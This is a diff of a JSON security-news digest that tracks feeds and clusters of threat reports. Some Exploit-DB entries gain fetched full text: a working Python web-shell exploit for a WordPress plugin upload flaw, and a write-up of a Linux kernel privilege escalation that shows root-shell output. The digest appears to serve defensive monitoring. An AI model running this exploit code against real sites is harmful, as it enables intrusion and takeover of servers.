@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-05-31T18:08:55.456441+00:00",
+  "generated_at": "2026-05-31T20:17:25.020620+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 78,
-  "total_items_in_window": 450,
-  "total_clusters_raw": 164,
-  "total_clusters_in_packet": 65,
-  "dropped_low_score": 99,
+  "total_items_in_window": 449,
+  "total_clusters_raw": 162,
+  "total_clusters_in_packet": 66,
+  "dropped_low_score": 96,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -81,6 +81,20 @@
       "item_count": 15,
       "in_window_count": 2
     },
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 5
+    },
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
@@ -95,26 +109,19 @@
       "item_count": 24,
       "in_window_count": 0
     },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 5
-    },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "Cisco Talos": {
+      "url": "https://feeds.feedburner.com/feedburner/Talos",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 4
     },
     "Microsoft Threat Intelligence": {
       "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
@@ -130,12 +137,12 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "Cisco Talos": {
-      "url": "https://feeds.feedburner.com/feedburner/Talos",
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 4
+      "item_count": 10,
+      "in_window_count": 2
     },
     "Kaspersky Securelist": {
       "url": "https://securelist.com/feed/",
@@ -144,11 +151,11 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 15,
       "in_window_count": 2
     },
     "SANS Internet Storm Center": {
@@ -158,32 +165,18 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
-    },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 4
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 100,
-      "in_window_count": 4
-    },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
       "in_window_count": 4
     },
     "Assetnote": {
@@ -193,12 +186,19 @@
       "item_count": 78,
       "in_window_count": 0
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 3
+      "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 28
     },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
@@ -214,12 +214,12 @@
       "item_count": 40,
       "in_window_count": 0
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 28
+      "in_window_count": 0
     },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
@@ -235,19 +235,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 0
-    },
-    "TrustedSec": {
-      "url": "https://www.trustedsec.com/feed/",
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 0
     },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
@@ -256,19 +249,19 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 3
     },
-    "Sophos X-Ops": {
-      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
+    "TrustedSec": {
+      "url": "https://www.trustedsec.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
@@ -276,6 +269,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Sophos X-Ops": {
+      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 0
     },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
@@ -298,12 +298,12 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "AWS Security Blog": {
-      "url": "https://aws.amazon.com/blogs/security/feed/",
-      "cohort": "cloud_identity_infrastructure",
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 4
+      "in_window_count": 5
     },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
@@ -312,19 +312,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
+    "AWS Security Blog": {
+      "url": "https://aws.amazon.com/blogs/security/feed/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 5
-    },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 3
+      "in_window_count": 4
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -332,6 +325,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 0
+    },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 3
     },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
@@ -361,19 +361,19 @@
       "item_count": 100,
       "in_window_count": 5
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
@@ -382,16 +382,16 @@
       "item_count": 20,
       "in_window_count": 18
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
     },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
@@ -403,12 +403,12 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
+      "item_count": 100,
+      "in_window_count": 0
     },
     "BleepingComputer": {
       "url": "https://www.bleepingcomputer.com/feed/",
@@ -417,19 +417,12 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "The Record": {
+      "url": "https://therecord.media/feed",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
+      "item_count": 5,
+      "in_window_count": 5
     },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
@@ -438,12 +431,26 @@
       "item_count": 20,
       "in_window_count": 0
     },
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
+    },
     "Simon Willison": {
       "url": "https://simonwillison.net/atom/everything/",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 30,
-      "in_window_count": 24
+      "in_window_count": 23
+    },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
@@ -451,13 +458,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
     },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
@@ -473,6 +473,20 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
       "cohort": "cyber_news_breach_reporting",
@@ -487,9 +501,9 @@
       "item_count": 10,
       "in_window_count": 4
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
+    "Team Cymru": {
+      "url": "https://www.team-cymru.com/post/rss.xml",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 1
@@ -501,40 +515,12 @@
       "item_count": 15,
       "in_window_count": 1
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Team Cymru": {
-      "url": "https://www.team-cymru.com/post/rss.xml",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 1
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 33
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 4
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -543,6 +529,20 @@
       "item_count": 100,
       "in_window_count": 21
     },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 4
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 33
+    },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
       "cohort": "reddit_practitioner_osint",
@@ -550,12 +550,12 @@
       "item_count": 25,
       "in_window_count": 24
     },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "item_count": 25,
+      "in_window_count": 25
     },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
@@ -564,12 +564,12 @@
       "item_count": 25,
       "in_window_count": 23
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
+      "item_count": 100,
+      "in_window_count": 0
     },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
@@ -585,20 +585,6 @@
       "item_count": 25,
       "in_window_count": 15
     },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 14
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 25
-    },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
@@ -612,6 +598,20 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 4
+    },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 25
+    },
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 14
     },
     "Just Security": {
       "url": "https://www.justsecurity.org/feed/",
@@ -1564,8 +1564,8 @@
     {
       "cluster_id": "da583a9e4e",
       "priority_score": 24,
-      "member_count": 8,
-      "corroborating_source_count": 7,
+      "member_count": 7,
+      "corroborating_source_count": 6,
       "strong_signals": [
         "GitHub",
         "TeamPCP"
@@ -1766,34 +1766,6 @@
           }
         },
         {
-          "source": "Simon Willison",
-          "cohort": "ai_security_agentic_risk",
-          "title": "Quoting Armin Ronacher",
-          "link": "https://simonwillison.net/2026/May/24/armin-ronacher/#atom-everything",
-          "published": "2026-05-24T18:46:53+00:00",
-          "summary": "The most frustrating failure mode right now is that people submit issues that are not in their own voice. They contain an observed problem somewhere, but it has been thrown into a clanker and the clanker reworded it and made a huge mess of it. Typically, it was prompted so badly that the conclusions produced are more often than not inaccurate but always full of confidence. The result is complete guesswork on root causes, fake-minimal repros, suggested implementation strategies, analogies to adjacent but often the wrong code, and long lists of error classes that might or might not matter. [...] So at least personally, I increasingly want issue reports to be condensed to what the human actually observed: I ran this command. I expected this to happen. This happened instead. Here is the exact error or log. — Armin Ronacher , on slop issues filed against Pi Tags: ai , github-issues , llms , ai-ethics , open-source , coding-agents , generative-ai , armin-ronacher , pi , slop",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
           "source": "Dark Reading",
           "cohort": "cyber_news_breach_reporting",
           "title": "Shai-Hulud Hackers TeamPCP: Lucky or Skilled?",
@@ -1985,14 +1957,21 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "web_shell_backdoor"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "WordPress"
+        ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-1830"
+        ],
         "attack_techniques": [],
         "urgency_signals": [
+          "poc_available",
           "preauth_unauth"
         ],
         "content_type": [
@@ -2009,22 +1988,31 @@
         "link": "https://www.exploit-db.com/exploits/52596",
         "published": "2026-05-29T00:00:00+00:00",
         "summary": "Quick Playground for WordPress 1.3.1 - Unauthenticated Remote Code Execution",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Quick Playground for WordPress 1.3.1 - Unauthenticated Remote Code Execution EDB-ID: 52596 CVE: 2026-1830 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: Multiple Date: 2026-05-29 Vulnerable App: # Exploit Title: Quick Playground for WordPress 1.3.1 - Unauthenticated Remote Code Execution # Google Dork: N/A # Date: 2026-05-22 # Exploit Author: cardosource # Vendor Homepage: https://quickplayground.com # Software Link: https://downloads.wordpress.org/plugin/quick-playground.1.3.1.zip # Version: <= 1.3.1 # Tested on: Docker / Debian / Apache / PHP 8.2 / WordPress 6.x # CVE: CVE-2026-1830 # # Description: # # The Quick Playground plugin exposes a REST API endpoint: # # /wp-json/quickplayground/v1/upload_image/{profile} # # The endpoint validates uploads exclusively through a sync_code value # without requiring authenticated WordPress sessions or capability checks. # # Vulnerable code: # # if($code == $sync_code) # return true; # # If a valid sync_code is known, weak, reused, leaked, or predictable, # an attacker can upload arbitrary files using path traversal sequences. # # This PoC demonstrates arbitrary PHP file upload resulting in remote # command execution in a controlled local lab environment. # # LAB SETUP: # # docker exec -it <container> \\ # wp option update qckply_sync_code_default 'exploit123' --allow-root # # Usage: # # python3 poc.py # import requests import base64 import random import string import re TARGET = \"http://localhost:8080\" SYNC_CODE = \"exploit123\" PROFILE = \"default\" s = requests.Session() s.headers.update({ \"User-Agent\": \"Mozilla/5.0\", \"Content-Type\": \"application/json\" }) name = ''.join(random.choices(string.ascii_lowercase, k=8)) + \".php\" shell = b'<?php if(isset($_GET[\"cmd\"])){echo \"<pre>\";system($_GET[\"cmd\"]);echo \"</pre>\";} ?>' payload = { \"sync_code\": SYNC_CODE, \"filename\": f\"../../../{name}\", \"base64\": base64.b64encode(shell).decode() } url = f\"{TARGET}/wp-json/quickplayground/v1/upload_image/{PROFILE}\" print(\"[-] Sending webshell...\") r = s.post(url, json=payload, timeout=15) try: msg = r.json().get(\"message\", \"\") except: print(\"[-] Invalid server response\") exit() if \"saving to\" not in msg: print(\"[-] Upload failed\") print(r.text[:300]) exit() print(\"[-] Checking execution...\") shell_url = f\"{TARGET}/{name}\" r = s.get(shell_url, params={\"cmd\": \"id\"}, timeout=10) m = re.search(r\"<pre>(.*?)</pre>\", r.text, re.DOTALL) if not m: print(\"[-] Shell not responding\") exit() print(\"[+] RCE CONFIRMED!\") print(f\"[+] Shell: {shell_url}?cmd=command\") print(f\"[+] User: {m.group(1).strip()}\\n\") while True: cmd = input(\"$ \").strip() if cmd == \"exit\": break if not cmd: continue r = s.get(shell_url, params={\"cmd\": cmd}, timeout=30) m = re.search(r\"<pre>(.*?)</pre>\", r.text, re.DOTALL) if m: print(m.group(1).strip()) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "web_shell_backdoor"
+          ],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "WordPress"
+          ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-1830"
+          ],
           "attack_techniques": [],
           "urgency_signals": [
-            "preauth_unauth"
+            "preauth_unauth",
+            "poc_available"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
+          "role_map": {
+            "WordPress": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -2039,19 +2027,28 @@
           "published": "2026-05-29T00:00:00+00:00",
           "summary": "Quick Playground for WordPress 1.3.1 - Unauthenticated Remote Code Execution",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "web_shell_backdoor"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "WordPress"
+            ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-1830"
+            ],
             "attack_techniques": [],
             "urgency_signals": [
-              "preauth_unauth"
+              "preauth_unauth",
+              "poc_available"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
+            "role_map": {
+              "WordPress": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -3118,9 +3115,15 @@
           "Linux kernel"
         ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-43284",
+          "CVE-2026-43500",
+          "CVE-2026-46300"
+        ],
         "attack_techniques": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "poc_available"
+        ],
         "content_type": [
           "news_report"
         ],
@@ -3136,8 +3139,8 @@
         "link": "https://www.exploit-db.com/exploits/52591",
         "published": "2026-05-29T00:00:00+00:00",
         "summary": "Linux Kernel - Local Privilege Escalation",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Linux Kernel - Local Privilege Escalation EDB-ID: 52591 CVE: 2026-46300 2026-43500 2026-43284 EDB Verified: Author: nu11secur1ty Type: local Exploit: / Platform: Linux Date: 2026-05-29 Vulnerable App: # Titles:** Linux Kernel Local Privilege Escalation (CVE-2026-43284 / CVE-2026-43500 / CVE-2026-46300) # Author:** nu11secur1ty # Date:** 2026-05-11 # Vendor:** Linux Kernel # Software:** Linux Kernel (All major distributions) # Vulnerability Type:** Page-Cache Write / Memory Corruption # Status:** HIGH / CRITICAL --- ## Description The **\"Kukurigu\"** exploit represents a sophisticated local privilege escalation (LPE) vector targeting the Linux kernel's page-cache management. The vulnerability is not a single bug, but a strategic chain of two distinct flaws that allow an unprivileged attacker to bypass standard filesystem write protections. ### Vulnerability Chain: 1. **CVE-2026-43284 (xfrm-ESP):** A logic error in the ESP protocol implementation when Extended Sequence Numbers (ESN) are active. This flaw allows a local user to perform arbitrary 4-byte writes directly into the page-cache. 2. **CVE-2026-43500 (RxRPC):** A flaw in the RxRPC protocol that facilitates in-place decryption of data within page-cache pages. 3. **CVE-2026-46300 (Fragnesia - ESP-in-TCP):** A bug in `skb_try_coalesce()` allowing page-cache write via fragmented ESP packets. ### Impact Analysis: By chaining these vulnerabilities, an attacker can modify the memory-resident pages of setuid binaries (e.g., `/usr/bin/su` or `/usr/bin/sudo`) or sensitive system files (e.g., `/etc/passwd`). Because the modification occurs in the page-cache, the attacker effectively \"poison\" the execution environment. **Key Advantages for Attacker:** * **Stability:** No race conditions involved. * **Reliability:** Near 100% success rate on tested environments. * **Stealth:** Does not trigger kernel panics or system instability upon failure. * **Persistence:** Affects kernels spanning nearly 9 years (2017-01-17 to 2026-05-10). --- ## Affected Systems (Verified) The following distributions have been tested and confirmed vulnerable: * **Ubuntu:** 24.04.4 / 25.10 / 26.04 * **RHEL:** 10.1 * **openSUSE:** Tumbleweed * **CentOS Stream:** 10 * **AlmaLinux:** 10 * **Fedora:** 44 --- ## Proof of Concept (PoC) ### Execution Flow: ```bash # Compiling the exploit tool $ gcc -O2 kukurigu.c -o kukurigu_exploit # Running the exploit against a target binary $ ./kukurigu_exploit --target /usr/bin/su --method esp [+] Initializing Kukurigu LPE engine... [+] Exploiting CVE-2026-43284 (xfrm-ESP write)... [+] Exploiting CVE-2026-43500 (RxRPC decryption)... [+] Exploiting CVE-2026-46300 (Fragnesia)... [+] Page-cache poisoned successfully for /usr/bin/su. [+] Dropping into root shell... # id uid=0(root) gid=0(root) groups=0(root) [+]Exploit: [href]( https://github.com/nu11secur1ty/CVE-mitre/tree/main/2026/CVE-2026-43284-CVE-2026-43500 ) # Demo: [href](https://www.patreon.com/posts/cve-2026-43284-157962202) [href](https://www.patreon.com/posts/cve-2026-46300-k-158433402) # Patch if you want: [href](https://www.patreon.com/posts/cve-2026-43284-157966167) # Time spent: 01:30:00 -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/> -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstorm.news/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ 0day Exploit DataBase https://0day.today/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <http://",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
@@ -3146,9 +3149,15 @@
             "Linux kernel"
           ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-43284",
+            "CVE-2026-43500",
+            "CVE-2026-46300"
+          ],
           "attack_techniques": [],
-          "urgency_signals": [],
+          "urgency_signals": [
+            "poc_available"
+          ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
           "role_map": {
@@ -3175,9 +3184,15 @@
               "Linux kernel"
             ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-43284",
+              "CVE-2026-43500",
+              "CVE-2026-46300"
+            ],
             "attack_techniques": [],
-            "urgency_signals": [],
+            "urgency_signals": [
+              "poc_available"
+            ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {
@@ -3779,9 +3794,12 @@
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-34473"
+        ],
         "attack_techniques": [],
         "urgency_signals": [
+          "poc_available",
           "preauth_unauth"
         ],
         "content_type": [
@@ -3798,8 +3816,8 @@
         "link": "https://www.exploit-db.com/exploits/52594",
         "published": "2026-05-29T00:00:00+00:00",
         "summary": "ZTE Routers - Unauthenticated Denial of Service",
-        "full_body": "",
